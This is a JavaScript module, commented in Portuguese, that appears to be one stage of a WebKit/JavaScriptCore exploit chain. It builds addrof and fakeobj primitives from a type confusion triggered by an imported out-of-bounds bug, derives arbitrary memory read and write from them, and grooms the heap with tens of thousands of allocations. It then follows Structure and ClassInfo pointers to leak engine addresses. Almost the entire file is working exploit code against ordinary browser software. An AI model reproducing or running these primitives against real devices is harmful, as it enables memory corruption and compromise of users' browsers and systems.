// js/script3/testArrayBufferVictimCrash.mjs (v108 - R96 - Final Primitives in Crashing Context)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. Manter o fluxo do script R91, que causa o crash, preservando 100% da lógica.
// 2. Integrar a técnica de construção de uma `addrof` robusta (`addrof_via_rw`)
//    usando a primitiva de Leitura/Escrita estável.
// 3. Substituir todas as chamadas à `addrof` instável pela nova `addrof_via_rw`.
// 4. OBJETIVO: Executar a Tentativa 5 até o fim, sem crash e sem poluição,
//    vazando ponteiros válidos e provando que temos todas as ferramentas para a exploração.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R96_FinalPrimitives";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    // ... (código completo e inalterado)
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            return defaultValue;
        }
    }
    if (typeof current === 'number') return current;
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    return defaultValue;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Primitivas Finais no Contexto do Crash ---`, "test");

    let final_result = { /* ... */ };
    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("--- FASE 1: Configuração OOB e Primitivas de Base ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) { throw new Error("Falha ao obter primitiva OOB."); }
        
        const one_shot_confused = [13.37];
        const one_shot_victim = [{ a: 1 }];
        const addrof_onetime = (obj) => {
            one_shot_victim[0] = obj;
            return doubleToInt64(one_shot_confused[0]);
        };
        const fakeobj_onetime = (addr) => {
            one_shot_confused[0] = int64ToDouble(addr);
            return one_shot_victim[0];
        };
        logS3("Primitivas 'one-shot' criadas.", "info");

        logS3("--- FASE 2: Construção de Primitivas de L/E Estáveis ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        addrof_onetime(leaker); // Aquece a primitiva uma vez para o leaker.
        
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj_onetime(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj_onetime(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita (`arb_read/write_final`) estão prontas e estáveis.", "good");

        logS3("--- FASE 3: Construção da `addrof` Robusta via L/E ---", "subtest");
        const LOCAL_JSC_OFFSETS = { JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET') };
        if (LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET === 0) { throw new Error("Offset JSObject_BUTTERFLY_OFFSET é necessário."); }

        const addrof = (object_to_find) => {
            const container = [object_to_find];
            const container_addr = addrof_onetime(container);
            const butterfly_ptr = arb_read_final(container_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET));
            const object_addr = arb_read_final(butterfly_ptr);
            logS3(`  addrof_via_rw(${String(object_to_find).substring(0,20)}...) -> ${object_addr.toString(true)}`, "debug");
            return object_addr;
        };
        logS3("Primitiva `addrof` final e robusta está pronta.", "good");

        logS3("--- FASE 4: Verificação Final das Primitivas ---", "subtest");
        const obj1 = { test_id: 1 };
        const addr1 = addrof(obj1);
        let churn = []; for (let i = 0; i < 5000; i++) { churn.push({}); } churn = null; await PAUSE_S3(500);
        const obj2 = { test_id: 2 };
        const addr2 = addrof(obj2);
        if(addr1.equals(addr2) || addr1.equals(AdvancedInt64.Zero) || addr2.equals(AdvancedInt64.Zero)) {
            throw new Error(`A verificação da nova 'addrof' falhou. Addr1: ${addr1.toString(true)}, Addr2: ${addr2.toString(true)}`);
        }
        logS3(`Verificação de estabilidade da 'addrof' bem-sucedida. Addr1: ${addr1.toString(true)}, Addr2: ${addr2.toString(true)}`, "good");
        final_result.success = true;

        // --- FASE 5: Revisitando o Cenário do Crash com Ferramentas Robustas ---
        logS3("--- FASE 5: Revisitando o Cenário do Crash com Ferramentas Robustas ---", "subtest");
        
        let aggressive_feng_shui_objects, filler_objects;
        const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
        const NUM_FILLER_OBJECTS_STAGE1 = 15000;

        const do_grooming = async () => {
            logS3("  [Grooming] Executando a rotina de Heap Grooming que causa o crash...", "info");
            aggressive_feng_shui_objects = []; filler_objects = [];
            for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
            for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
            aggressive_feng_shui_objects = null; filler_objects = null;
            logS3("  [Grooming] Pausando para acionar GC...", "debug");
            await PAUSE_S3(10000);
            logS3("  [Grooming] Sobrevivemos ao GC. O heap está preparado.", "debug");
        };

        logS3("--- TENTATIVA DE VAZAMENTO FINAL: JSC::ClassInfo ---", "test");
        await do_grooming();
        
        try {
            const target_obj = {};
            const target_obj_addr = addrof(target_obj);
            logS3(`  Endereço do objeto alvo: ${target_obj_addr.toString(true)}`, "leak");

            if (!isAdvancedInt64Object(target_obj_addr) || target_obj_addr.equals(AdvancedInt64.Zero)) {
                throw new Error("addrof robusta retornou endereço inválido.");
            }

            const ALL_OFFSETS = { ...getSafeOffset(JSC_OFFSETS, 'JSCell'), ...getSafeOffset(JSC_OFFSETS, 'Structure'), ...getSafeOffset(JSC_OFFSETS, 'ClassInfo') };
            const structure_addr = arb_read_final(target_obj_addr.add(ALL_OFFSETS.STRUCTURE_POINTER_OFFSET));
            logS3(`  Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");
            if (structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero)){
                 throw new Error(`Structure* está poluído ou nulo: ${structure_addr.toString(true)}`);
            }

            const class_info_addr = arb_read_final(structure_addr.add(ALL_OFFSETS.CLASS_INFO_OFFSET));
            logS3(`  Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
            if (class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero)){
                 throw new Error(`ClassInfo* está poluído ou nulo: ${class_info_addr.toString(true)}`);
            }
            
            const cached_type_info_addr = arb_read_final(class_info_addr.add(ALL_OFFSETS.M_CACHED_TYPE_INFO_OFFSET));
             if (!isAdvancedInt64Object(cached_type_info_addr) || cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero)) {
                throw new Error(`m_cachedTypeInfo está poluído ou nulo: ${cached_type_info_addr.toString(true)}`);
            }
            logS3(`  LIDO VALOR FINAL: m_cachedTypeInfo do ClassInfo: ${cached_type_info_addr.toString(true)}`, "vuln");

            const is_sane_typeinfo_ptr = cached_type_info_addr.high() > 0x40000000;
            if (!is_sane_typeinfo_ptr) {
                throw new Error(`Ponteiro m_cachedTypeInfo (${cached_type_info_addr.toString(true)}) não parece um endereço de heap válido.`);
            }

            logS3(`++++++++++++ SUCESSO FINAL! PONTEIRO VÁLIDO VAZADO NO CONTEXTO DO CRASH! ++++++++++++`, "vuln");
            final_result.webkit_leak_details = {
                success: true,
                msg: `Endereço de JSC::ClassInfo::m_cachedTypeInfo vazado com sucesso: ${cached_type_info_addr.toString(true)}`
            };
            return final_result;

        } catch (leak_e) {
            logS3(`  Falha na tentativa de vazamento final: ${leak_e.message}`, "critical");
            throw leak_e;
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: final_result.message },
        webkit_leak_result: final_result.webkit_leak_details,
    };
}
